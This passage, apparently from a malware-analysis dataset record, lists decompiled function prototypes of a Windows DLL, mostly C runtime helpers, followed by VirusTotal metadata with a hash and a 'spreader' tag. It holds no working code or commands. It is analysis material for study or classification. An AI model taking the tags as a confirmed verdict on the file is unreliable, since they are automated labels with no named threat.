    "BOOL __cdecl sub_1002C610(unsigned int a1, __int64 *a2, __int16 a3);",
    "int __cdecl _raise_exc(ULONG_PTR Arguments, int a2, int a3, int a4, int a5, int a6);",
    "unsigned int __usercall sub_1002C970@<eax>(",
    "        __int16 a1@<fpstat>,",
    "        unsigned int *Arguments,",
    "        unsigned int *a3,",
    "        char a4,",
    "        int a5,",
    "        unsigned int *a6,",
    "        unsigned int *a7,",
    "        int a8);",
    "_DWORD *__cdecl _set_errno_from_matherr(int a1);",
    "double __cdecl sub_1002CCE0(int a1, int a2, int a3, int a4, int a5, int a6, double a7);",
    "double __cdecl sub_1002CDE0(double a1, int *a2);",
    "int __cdecl sub_1002CEF0(int a1, int a2);",
    "int __cdecl sub_1002CF70(__int64 a1, double a2, unsigned __int64 *a3);",
    "_DWORD *__usercall _87except@<eax>(int a1@<ebp>, int a2, int a3, __int16 *a4);",
    "int __cdecl sub_1002D277(double a1);",
    "int _alloca_probe_16();",
    "int _alloca_probe_8();",
    "int __cdecl _FindPESection(int a1, unsigned int a2);",
    "BOOL __cdecl _IsNonwritableInCurrentImage(int a1);",
    "BOOL __cdecl _ValidateImageBase(int a1);",
    "unsigned int __stdcall _aulldvrm(unsigned __int64 a1, __int64 a2);",
    "int __stdcall _alldiv(unsigned __int64 a1, __int64 a2);",
    "void *__usercall _alloca_probe@<eax>(unsigned int a1@<eax>, int a2@<ecx>);",
    "unsigned __int64 __stdcall _allmul(__int64 a1, __int64 a2);",
    "int __stdcall _alldvrm(unsigned __int64 a1, __int64 a2);",
    "unsigned __int64 __stdcall _allrem(unsigned __int64 a1, __int64 a2);",
    "unsigned __int64 __usercall _aullshr@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);",
    "int __usercall _allshl@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);",
    "char *__cdecl strrchr(const char *Str, int Ch);",
    "char *__cdecl strchr(const char *Str, int Val);",
    "int __cdecl _filter_x86_sse2_floating_point_exception_default(int a1);",
    "void __cdecl sub_1002F5B0();",
    "void __cdecl sub_1002F610();"
  ],
  "virustotal": {
    "sha256": "f66c0e08578f74038d28fa5c0b324e2ac2899bdcfbcb6ce1cfa0f3a983983fa4",
    "type_tag": "pedll",
    "popular_threat_name": null,
    "tags": [
      "pedll",
      "checks-user-input",
      "spreader"
    ]
  }
}